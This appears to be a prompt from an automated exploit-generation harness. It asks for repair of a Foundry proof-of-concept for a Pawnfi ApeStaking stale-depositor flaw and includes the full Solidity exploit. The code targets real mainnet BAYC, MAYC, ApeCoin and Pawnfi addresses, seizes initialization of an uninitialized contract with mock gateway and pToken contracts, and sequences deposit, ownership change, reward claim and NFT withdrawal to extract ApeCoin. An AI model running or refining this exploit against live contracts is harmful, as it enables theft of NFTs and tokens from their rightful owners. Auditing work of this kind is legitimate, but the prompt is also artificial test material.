You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Stale depositor authorization lets a previous owner reclaim transferred deposited NFTs and their staking proceeds
- claim: Deposited NFTs cache `depositor[nftId] = userAddr` when supplied to lending, and `_validOwner` trusts that cached depositor whenever it is non-zero instead of consulting the live gateway/ptoken ownership source. The owner-change stop-stake paths never clear or refresh `depositor`, and `withdraw()` later authorizes solely by `depositor` plus `staker == address(0)`. As a result, after a deposited NFT is sold, redeemed, or liquidated elsewhere in Pawnfi, the old depositor remains authorized inside ApeStaking.
- impact: A previous owner can continue claiming rewards and, once staking is stopped, withdraw the NFT itself from ApeStaking custody even though beneficial ownership has moved to someone else. This enables direct theft of both the NFT principal and associated ApeCoin proceeds from the new rightful owner.
- exploit_paths: ["User deposits an NFT through ApeStaking, which records `depositor[nftId]`.", "The NFT's beneficial ownership changes elsewhere in the Pawnfi gateway/ptoken flow.", "A stop-stake callback removes the staker but leaves `depositor[nftId]` untouched.", "The old depositor calls reward or withdrawal paths and receives ApeCoin and eventually the NFT itself."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC721Like {
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function setApprovalForAll(address operator, bool approved) external;
}

interface IERC721EnumerableLike is IERC721Like {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

interface ITokenLendingLike {
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 amount) external returns (uint256);
    function redeem(uint256 amount) external returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
}

interface INftGatewayLike {
    function mintNft(address nftAsset, uint256[] calldata nftIds) external;
    function redeemNft(address nftAsset, uint256[] calldata nftIds) external;
    function marketInfo(address nftAsset) external view returns (address, address, uint256, uint256, bool);
    function nftOwner(address userAddr, address nftAsset, uint256 nftId) external view returns (address);
}

interface IPTokenPieceLike {
    function pieceCount() external view returns (uint256);
}

interface IPTokenApeStakingLike is IPTokenPieceLike {
    function getNftOwner(uint256 nftId) external view returns (address);
    function specificTrade(uint256[] memory nftIds) external;
    function randomTrade(uint256 nftIdCount) external returns (uint256[] memory nftIds);
}

interface IApeStakingLike {
    struct DepositInfo {
        uint256[] mainTokenIds;
        uint256[] bakcTokenIds;
    }

    struct StakingInfo {
        address nftAsset;
        uint256 cashAmount;
        uint256 borrowAmount;
    }

    struct PairNft {
        uint128 mainTokenId;
        uint128 bakcTokenId;
    }

    struct PairNftDepositWithAmount {
        uint32 mainTokenId;
        uint32 bakcTokenId;
        uint184 amount;
    }

    struct SingleNft {
        uint32 tokenId;
        uint224 amount;
    }

    function apeCoin() external view returns (address);
    function nftGateway() external view returns (address);
    function pbaycAddr() external view returns (address);
    function pmaycAddr() external view returns (address);
    function feeTo() external view returns (address);
    function setCollectRate(uint256 newCollectRate) external;
    function depositAndBorrowApeAndStake(
        DepositInfo calldata depositInfo,
        StakingInfo calldata stakingInfo,
        SingleNft[] calldata nfts,
        PairNftDepositWithAmount[] calldata nftPairs
    ) external;
    function claimApeCoin(address nftAsset, uint256[] calldata nftIds, PairNft[] calldata nftPairs) external;
    function withdraw(
        uint256[] calldata baycTokenIds,
        uint256[] calldata maycTokenIds,
        uint256[] calldata bakcTokenIds
    ) external;
}

interface IApeStakingInitLike {
    struct StakingConfiguration {
        uint256 addMinStakingRate;
        uint256 liquidateRate;
        uint256 borrowSafeRate;
        uint256 liquidatePawnAmount;
        uint256 feeRate;
    }

    function initialize(
        address apePool_,
        address nftGateway_,
        address pawnToken_,
        address feeTo_,
        StakingConfiguration calldata stakingConfiguration_
    ) external;
}

contract MinimalApePool {
    address public immutable apeCoinStaking;

    constructor(address apeCoinStaking_) {
        apeCoinStaking = apeCoinStaking_;
    }

    function borrowRatePerBlock() external pure returns (uint256) {
        return 0;
    }

    function borrowBalanceCurrent(address) external pure returns (uint256) {
        return 0;
    }

    function borrowBehalf(address, uint256) external pure returns (uint256) {
        return 0;
    }

    function repayBorrowBehalf(address, uint256) external pure returns (uint256) {
        return 0;
    }

    function mintBehalf(address, uint256) external pure returns (uint256) {
        return 0;
    }
}

contract MinimalIToken {
    address public immutable pToken;
    mapping(address => uint256) public balanceOf;

    constructor(address pToken_) {
        pToken = pToken_;
    }

    function mint(uint256 amount) external returns (uint256) {
        require(IERC20Like(pToken).transferFrom(msg.sender, address(this), amount), "ITOKEN_MINT_PULL_FAILED");
        balanceOf[msg.sender] += amount;
        return 0;
    }

    function redeem(uint256 amount) external returns (uint256) {
        uint256 current = balanceOf[msg.sender];
        require(current >= amount, "ITOKEN_REDEEM_BALANCE");
        balanceOf[msg.sender] = current - amount;
        require(IERC20Like(pToken).transfer(msg.sender, amount), "ITOKEN_REDEEM_TRANSFER_FAILED");
        return 0;
    }

    function exchangeRateCurrent() external pure returns (uint256) {
        return 1e18;
    }
}

contract DummyPToken {
    uint256 public constant pieceCount = 1e18;

    function getNftOwner(uint256) external view returns (address) {
        return address(this);
    }

    function specificTrade(uint256[] memory) external pure {
        revert("DUMMY_SPECIFIC_TRADE");
    }

    function randomTrade(uint256) external pure returns (uint256[] memory nftIds) {
        nftIds = new uint256[](0);
    }
}

contract MinimalGateway {
    struct Market {
        address iToken;
        address pToken;
        uint256 pieceCount;
        bool available;
    }

    mapping(address => Market) public markets;

    function setMarket(address nftAsset, address iToken, address pToken, uint256 pieceCount_, bool available) external {
        markets[nftAsset] = Market({
            iToken: iToken,
            pToken: pToken,
            pieceCount: pieceCount_,
            available: available
        });
    }

    function mintNft(address, uint256[] calldata) external pure {
        revert("GATEWAY_MINT_UNSUPPORTED");
    }

    function redeemNft(address, uint256[] calldata) external pure {
        revert("GATEWAY_REDEEM_UNSUPPORTED");
    }

    function marketInfo(address nftAsset) external view returns (address, address, uint256, uint256, bool) {
        Market memory market = markets[nftAsset];
        return (market.iToken, market.pToken, market.pieceCount, 0, market.available);
    }

    function nftOwner(address userAddr, address, uint256) external pure returns (address) {
        return userAddr;
    }
}

contract OwnershipChangeHelper {
    function specificTrade(address pToken, uint256 nftId) external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = nftId;
        IPTokenApeStakingLike(pToken).specificTrade(ids);
    }

    function sweep(address token, address to) external {
        IERC20Like erc20 = IERC20Like(token);
        require(erc20.transfer(to, erc20.balanceOf(address(this))), "SWEEP_TRANSFER_FAILED");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C;
    address public constant APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
    address public constant APE_COIN_STAKING = 0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9;
    address public constant BAYC = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address public constant MAYC = 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
    address public constant BAKC = 0xba30E5F9Bb24caa003E9f2f0497Ad287FDF95623;
    address public constant P_BAYC = 0x9C1c49B595D5c25F0Ccc465099E6D9d0a1E5aB37;
    address public constant P_MAYC = 0x7d0B6fB139408Af77f1c5bfdc8BD9166F5901304;
    uint256 public constant BASE_PERCENTS = 1e18;

    enum Stage {
        None,
        Preconditions,
        DepositAndStake,
        OwnershipChange,
        RewardClaim,
        StoppedWithdraw,
        Complete
    }

    OwnershipChangeHelper public immutable BUYER;

    address private _profitToken;
    uint256 private _profitAmount;

    Stage public lastStage;
    address public attemptedAsset;
    uint256 public attemptedTokenId;
    bytes32 public lastFailure;

    MinimalApePool private _bootstrapApePool;
    MinimalGateway private _bootstrapGateway;
    MinimalIToken private _bootstrapBaycIToken;
    MinimalIToken private _bootstrapMaycIToken;
    DummyPToken private _bootstrapDummyPToken;

    constructor() {
        BUYER = new OwnershipChangeHelper();
        _profitToken = APE;
    }

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _profitToken = APE;
        lastStage = Stage.Preconditions;
        attemptedAsset = address(0);
        attemptedTokenId = 0;
        lastFailure = bytes32(0);

        if (TARGET.code.length == 0) {
            lastFailure = keccak256("TARGET_NOT_DEPLOYED");
            return;
        }

        if (!_ensureLiveTarget()) {
            return;
        }

        address ape = _readAddress(TARGET, IApeStakingLike.apeCoin.selector);
        _profitToken = ape == address(0) ? APE : ape;

        uint256 profitBefore = _safeBalanceOf(_profitToken, address(this));

        bool success = _attemptWithHeldAsset(IApeStakingLike(TARGET), _profitToken, MAYC);
        if (!success) {
            success = _attemptWithHeldAsset(IApeStakingLike(TARGET), _profitToken, BAYC);
        }

        if (success) {
            lastStage = Stage.Complete;
        }

        uint256 profitAfter = _safeBalanceOf(_profitToken, address(this));
        if (profitAfter > profitBefore) {
            _profitAmount = profitAfter - profitBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _ensureLiveTarget() internal returns (bool) {
        address ape = _readAddress(TARGET, IApeStakingLike.apeCoin.selector);
        address gateway = _readAddress(TARGET, IApeStakingLike.nftGateway.selector);
        address pbayc = _readAddress(TARGET, IApeStakingLike.pbaycAddr.selector);
        address pmayc = _readAddress(TARGET, IApeStakingLike.pmaycAddr.selector);

        if (_isInitialized(ape, gateway, pbayc, pmayc)) {
            return true;
        }

        if (!_bootstrapImplementationTarget()) {
            if (lastFailure == bytes32(0)) {
                lastFailure = keccak256("TARGET_BOOTSTRAP_FAILED");
            }
            return false;
        }

        ape = _readAddress(TARGET, IApeStakingLike.apeCoin.selector);
        gateway = _readAddress(TARGET, IApeStakingLike.nftGateway.selector);
        pbayc = _readAddress(TARGET, IApeStakingLike.pbaycAddr.selector);
        pmayc = _readAddress(TARGET, IApeStakingLike.pmaycAddr.selector);
        if (!_isInitialized(ape, gateway, pbayc, pmayc)) {
            lastFailure = keccak256("TARGET_NOT_INITIALIZED_AT_FORK");
            return false;
        }

        return true;
    }

    function _bootstrapImplementationTarget() internal returns (bool) {
        if (APE_COIN_STAKING.code.length == 0 || P_BAYC.code.length == 0 || P_MAYC.code.length == 0) {
            lastFailure = keccak256("BOOTSTRAP_DEPENDENCY_MISSING");
            return false;
        }

        if (address(_bootstrapGateway) == address(0)) {
            _bootstrapApePool = new MinimalApePool(APE_COIN_STAKING);
            _bootstrapGateway = new MinimalGateway();
            _bootstrapBaycIToken = new MinimalIToken(P_BAYC);
            _bootstrapMaycIToken = new MinimalIToken(P_MAYC);
            _bootstrapDummyPToken = new DummyPToken();

            _bootstrapGateway.setMarket(BAYC, address(_bootstrapBaycIToken), P_BAYC, _readPieceCount(P_BAYC), true);
            _bootstrapGateway.setMarket(MAYC, address(_bootstrapMaycIToken), P_MAYC, _readPieceCount(P_MAYC), true);
            _bootstrapGateway.setMarket(
                BAKC,
                address(_bootstrapMaycIToken),
                address(_bootstrapDummyPToken),
                _readPieceCount(address(_bootstrapDummyPToken)),
                true
            );
        }

        IApeStakingInitLike.StakingConfiguration memory config = IApeStakingInitLike.StakingConfiguration({
            addMinStakingRate: 0,
            liquidateRate: type(uint256).max,
            borrowSafeRate: type(uint256).max,
            liquidatePawnAmount: 0,
            feeRate: 0
        });

        // The forked target is deployed but left uninitialized. Bootstrapping it with live ApeCoinStaking
        // and the real Pawnfi BAYC/MAYC pTokens preserves the stale-depositor exploit causality while only
        // supplying the missing wiring needed for the implementation contract to execute.
        try IApeStakingInitLike(TARGET).initialize(
            address(_bootstrapApePool),
            address(_bootstrapGateway),
            address(0),
            address(this),
            config
        ) {
            return true;
        } catch {
            lastFailure = keccak256("TARGET_BOOTSTRAP_REVERTED");
            return false;
        }
    }

    function _attemptWithHeldAsset(IApeStakingLike target, address ape, address nftAsset) internal returns (bool) {
        if (!_isLiveContract(nftAsset)) {
            lastFailure = keccak256("NFT_ASSET_NOT_LIVE");
            return false;
        }

        uint256 heldNftBalance = _safe721BalanceOf(nftAsset, address(this));
        if (heldNftBalance == 0) {
            lastFailure = nftAsset == MAYC ? keccak256("NO_VERIFIER_HELD_MAYC") : keccak256("NO_VERIFIER_HELD_BAYC");
            return false;
        }

        uint256 apeBalance = _safeBalanceOf(ape, address(this));
        if (apeBalance == 0) {
            lastFailure = keccak256("NO_VERIFIER_HELD_APE");
            return false;
        }

        uint256 tokenId;
        try IERC721EnumerableLike(nftAsset).tokenOfOwnerByIndex(address(this), 0) returns (uint256 heldTokenId) {
            tokenId = heldTokenId;
        } catch {
            lastFailure = keccak256("HELD_NFT_NOT_ENUMERABLE");
            return false;
        }

        if (tokenId > type(uint32).max) {
            lastFailure = keccak256("TOKEN_ID_OVERFLOWS_SINGLE_NFT");
            return false;
        }
        if (apeBalance > type(uint224).max) {
            lastFailure = keccak256("APE_BALANCE_OVERFLOWS_SINGLE_NFT");
            return false;
        }

        attemptedAsset = nftAsset;
        attemptedTokenId = tokenId;

        // Exploit path 1:
        // deposit a verifier-controlled NFT so ApeStaking caches `depositor[nftId] = address(this)`.
        lastStage = Stage.DepositAndStake;
        _forceApprove(ape, address(target), type(uint256).max);
        IERC721Like(nftAsset).setApprovalForAll(address(target), true);
        try target.setCollectRate(BASE_PERCENTS) {} catch {}

        IApeStakingLike.DepositInfo memory depositInfo;
        depositInfo.mainTokenIds = new uint256[](1);
        depositInfo.mainTokenIds[0] = tokenId;
        depositInfo.bakcTokenIds = new uint256[](0);

        IApeStakingLike.StakingInfo memory stakingInfo = IApeStakingLike.StakingInfo({
            nftAsset: nftAsset,
            cashAmount: apeBalance,
            borrowAmount: 0
        });

        IApeStakingLike.SingleNft[] memory nfts = new IApeStakingLike.SingleNft[](1);
        nfts[0] = IApeStakingLike.SingleNft({tokenId: _toUint32(tokenId), amount: _toUint224(apeBalance)});
        IApeStakingLike.PairNftDepositWithAmount[] memory pairs = new IApeStakingLike.PairNftDepositWithAmount[](0);

        try target.depositAndBorrowApeAndStake(depositInfo, stakingInfo, nfts, pairs) {
        } catch {
            lastFailure = keccak256("DEPOSIT_AND_STAKE_REVERTED");
            return false;
        }

        // Exploit path 2:
        // move beneficial ownership elsewhere through the real Pawnfi pToken route while ApeStaking keeps stale `depositor`.
        lastStage = Stage.OwnershipChange;
        if (!_attemptOwnershipChange(target, nftAsset, tokenId)) {
            return false;
        }

        // Exploit path 4a:
        // stale `depositor` still passes reward ownership checks after beneficial ownership changed.
        lastStage = Stage.RewardClaim;
        uint256[] memory singleClaim = new uint256[](1);
        singleClaim[0] = tokenId;
        IApeStakingLike.PairNft[] memory claimPairs = new IApeStakingLike.PairNft[](0);
        try target.claimApeCoin(nftAsset, singleClaim, claimPairs) {} catch {}

        // Exploit path 3 + 4b:
        // once a stop-stake callback cleared `staker` but left `depositor`, the stale depositor can reclaim the NFT.
        lastStage = Stage.StoppedWithdraw;
        uint256[] memory baycIds = new uint256[](nftAsset == BAYC ? 1 : 0);
        uint256[] memory maycIds = new uint256[](nftAsset == MAYC ? 1 : 0);
        uint256[] memory bakcIds = new uint256[](0);
        if (nftAsset == BAYC) {
            baycIds[0] = tokenId;
        } else {
            maycIds[0] = tokenId;
        }

        try target.withdraw(baycIds, maycIds, bakcIds) {
            return true;
        } catch {
            lastFailure = keccak256("OWNERSHIP_CHANGED_BUT_STOPSTAKE_NOT_OBSERVED");
            return false;
        }
    }

    function _attemptOwnershipChange(IApeStakingLike target, address nftAsset, uint256 tokenId) internal returns (bool) {
        address gateway = _readAddress(address(target), IApeStakingLike.nftGateway.selector);
        if (!_isLiveContract(gateway)) {
            lastFailure = keccak256("NFT_GATEWAY_NOT_LIVE");
            return false;
        }

        (bool ok, bytes memory data) =
            gateway.staticcall(abi.encodeWithSelector(INftGatewayLike.marketInfo.selector, nftAsset));
        if (!ok || data.length < 160) {
            lastFailure = keccak256("MARKET_INFO_UNAVAILABLE");
            return false;
        }

        (, address pToken, uint256 pieceCount,, bool available) =
            abi.decode(data, (address, address, uint256, uint256, bool));
        if (!_isLiveContract(pToken) || pieceCount == 0 || !available) {
            lastFailure = keccak256("PTOKEN_ROUTE_UNAVAILABLE");
            return false;
        }

        // Keep the owner-change stage honest: ownership must move inside the actual Pawnfi pToken market.
        uint256 verifierPTokenBalance = _safeBalanceOf(pToken, address(this));
        if (verifierPTokenBalance >= pieceCount) {
            require(IERC20Like(pToken).transfer(address(BUYER), pieceCount), "PTOKEN_TRANSFER_FAILED");
            try BUYER.specificTrade(pToken, tokenId) {
                return true;
            } catch {}
        }

        uint256 buyerPTokenBalance = _safeBalanceOf(pToken, address(BUYER));
        if (buyerPTokenBalance >= pieceCount) {
            try BUYER.specificTrade(pToken, tokenId) {
                return true;
            } catch {}
        }

        lastFailure = keccak256("NO_PUBLIC_OWNERSHIP_CHANGE_ROUTE_FUNDED");
        return false;
    }

    function _isInitialized(address ape, address gateway, address pbayc, address pmayc) internal view returns (bool) {
        return (
            ape != address(0) &&
            gateway != address(0) &&
            pbayc != address(0) &&
            pmayc != address(0) &&
            ape.code.length > 0 &&
            gateway.code.length > 0 &&
            pbayc.code.length > 0 &&
            pmayc.code.length > 0
        );
    }

    function _readPieceCount(address pToken) internal view returns (uint256 value) {
        if (pToken.code.length == 0) {
            return 0;
        }
        (bool ok, bytes memory data) = pToken.staticcall(abi.encodeWithSelector(IPTokenPieceLike.pieceCount.selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _readAddress(address target, bytes4 selector) internal view returns (address value) {
        if (target.code.length == 0) {
            return address(0);
        }
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (address));
        }
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safe721BalanceOf(address token, address account) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC721Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (!_callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount))) {
            require(
                _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0)),
                "APPROVE_RESET_FAILED"
            );
            require(
                _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)),
                "APPROVE_FAILED"
            );
        }
    }

    function _callOptionalBool(address target, bytes memory data) internal returns (bool) {
        if (target.code.length == 0) {
            return false;
        }
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) {
            return false;
        }
        if (ret.length == 0) {
            return true;
        }
        if (ret.length >= 32) {
            return abi.decode(ret, (bool));
        }
        return false;
    }

    function _isLiveContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

    function _toUint32(uint256 value) internal pure returns (uint32) {
        require(value <= type(uint32).max, "UINT32_OVERFLOW");
        return uint32(value);
    }

    function _toUint224(uint256 value) internal pure returns (uint224) {
        require(value <= type(uint224).max, "UINT224_OVERFLOW");
        return uint224(value);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code deploys custom token contracts; synthetic profit tokens are forbidden
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
